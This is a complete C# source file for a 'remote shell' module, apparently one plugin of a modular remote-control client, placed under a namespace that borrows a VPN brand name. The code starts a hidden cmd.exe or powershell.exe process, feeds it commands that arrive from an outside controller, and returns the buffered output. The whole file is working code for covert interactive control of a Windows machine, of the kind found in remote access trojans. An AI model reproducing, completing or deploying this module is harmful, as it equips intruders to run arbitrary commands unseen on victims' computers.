// language: C#, file: RemoteShellModule.cs, target: net472
// *Persistent interactive shell on the client; stdout/stderr piped into a shared buffer*

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace mullvad.Module.RemoteShell
{
    public sealed class RemoteShellModule
    {
        public static string ModuleId => "mullvad.remoteshell";

        private static Process?      _proc;
        private static StringBuilder _buf    = new StringBuilder();
        private static readonly object _lock = new object();

        public string Execute(string action, string payload)
        {
            switch (action)
            {
                case "start": return DoStart(payload);
                case "exec":  return DoExec(payload);
                case "read":  return DoRead();
                case "stop":  return DoStop();
                default:      return Err("unknown action: " + action);
            }
        }

        // ── start ─────────────────────────────────────────────────────────────
        // payload JSON: {"shell":"cmd"|"powershell","cwd":"optional path"}

        private static string DoStart(string payload)
        {
            DoStop();   // kill any existing shell first

            string shell = "cmd";
            string cwd   = "";
            try
            {
                var d = SimpleJson.Parse(payload);
                if (d.ContainsKey("shell")) shell = d["shell"];
                if (d.ContainsKey("cwd"))   cwd   = d["cwd"];
            }
            catch { }

            string exe  = string.Equals(shell, "powershell", StringComparison.OrdinalIgnoreCase)
                ? "powershell.exe"
                : "cmd.exe";
            string args = string.Equals(shell, "powershell", StringComparison.OrdinalIgnoreCase)
                ? "-NoLogo -NoProfile -NonInteractive"
                : "/Q /K prompt $P$G";

            var psi = new ProcessStartInfo
            {
                FileName               = exe,
                Arguments              = args,
                UseShellExecute        = false,
                RedirectStandardInput  = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding  = Encoding.UTF8,
            };
            if (!string.IsNullOrEmpty(cwd) && Directory.Exists(cwd))
                psi.WorkingDirectory = cwd;

            try
            {
                _proc = Process.Start(psi);
                if (_proc == null) return Err("Process.Start returned null");

                lock (_lock) { _buf.Clear(); }

                // Two reader threads: one for stdout, one for stderr
                var outThread = new Thread(() => PipeReader(_proc.StandardOutput)) { IsBackground = true, Name = "rs_stdout" };
                var errThread = new Thread(() => PipeReader(_proc.StandardError))  { IsBackground = true, Name = "rs_stderr" };
                outThread.Start();
                errThread.Start();

                return "ok";
            }
            catch (Exception ex)
            {
                return Err(ex.Message);
            }
        }

        // ── exec ──────────────────────────────────────────────────────────────
        // Write a command to stdin; wait up to 10s for output to settle, then return it.

        private static string DoExec(string cmd)
        {
            if (_proc == null || _proc.HasExited)
                return Err("shell not running");

            lock (_lock) { _buf.Clear(); }

            try
            {
                _proc.StandardInput.WriteLine(cmd);
                _proc.StandardInput.Flush();
            }
            catch (Exception ex) { return Err(ex.Message); }

            // Poll until quiet for 300 ms or 10 s total
            string last    = "";
            int    elapsed = 0;
            int    quiet   = 0;

            while (elapsed < 10000)
            {
                Thread.Sleep(80);
                elapsed += 80;

                string cur;
                lock (_lock) { cur = _buf.ToString(); }

                if (cur == last)
                {
                    quiet += 80;
                    if (quiet >= 320) break;
                }
                else
                {
                    quiet = 0;
                    last  = cur;
                }
            }

            return DoRead();
        }

        // ── read ──────────────────────────────────────────────────────────────

        private static string DoRead()
        {
            lock (_lock)
            {
                string s = _buf.ToString();
                _buf.Clear();
                return s;
            }
        }

        // ── stop ──────────────────────────────────────────────────────────────

        private static string DoStop()
        {
            var p = _proc;
            _proc = null;
            if (p == null) return "ok";
            try
            {
                if (!p.HasExited) { p.Kill(); p.WaitForExit(2000); }
                p.Dispose();
            }
            catch { }
            return "ok";
        }

        // ── helpers ───────────────────────────────────────────────────────────

        private static void PipeReader(StreamReader sr)
        {
            try
            {
                char[] chunk = new char[4096];
                int n;
                while ((n = sr.Read(chunk, 0, chunk.Length)) > 0)
                    lock (_lock) { _buf.Append(chunk, 0, n); }
            }
            catch { }
        }

        private static string Err(string msg) => "error:" + msg;
    }

    // Minimal string-only JSON parser shared with other modules
    internal static class SimpleJson
    {
        public static Dictionary<string, string> Parse(string json)
        {
            var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            if (string.IsNullOrWhiteSpace(json)) return d;
            int i = 0;
            while (i < json.Length)
            {
                i = json.IndexOf('"', i); if (i < 0) break; i++;
                int ks = i;
                i = json.IndexOf('"', i); if (i < 0) break;
                string key = json.Substring(ks, i - ks); i++;
                i = json.IndexOf(':', i); if (i < 0) break; i++;
                while (i < json.Length && json[i] != '"') i++;
                if (i >= json.Length) break; i++;
                var sb = new StringBuilder();
                while (i < json.Length && json[i] != '"')
                {
                    if (json[i] == '\\' && i + 1 < json.Length)
                    {
                        char c = json[++i];
                        sb.Append(c == 'n' ? '\n' : c == 'r' ? '\r' : c == 't' ? '\t' : c);
                    }
                    else sb.Append(json[i]);
                    i++;
                }
                i++;
                d[key] = sb.ToString();
            }
            return d;
        }
    }
}
